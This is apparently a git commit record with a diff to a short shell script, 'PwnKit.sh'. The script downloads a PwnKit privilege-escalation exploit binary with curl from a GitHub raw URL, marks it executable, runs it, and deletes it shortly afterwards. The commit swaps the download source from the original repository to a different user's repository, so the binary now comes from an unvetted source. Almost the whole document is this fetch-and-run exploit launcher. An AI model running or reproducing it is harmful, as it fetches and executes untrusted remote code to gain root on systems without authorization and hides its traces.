88601bbbeafef752085cf183ca465358be8f0297
mr skk <suryanaepon7@gmail.com>
2025-06-29 16:30:06 +0700

    Update PwnKit.sh

--- PwnKit.sh
+++ PwnKit.sh
@@ -1,4 +1,4 @@
-curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
+curl -fsSL https://raw.githubusercontent.com/skkgrup/novel/refs/heads/main/PwnKit -o PwnKit || exit
 chmod +x ./PwnKit || exit
 (sleep 1 && rm ./PwnKit & )
 ./PwnKit
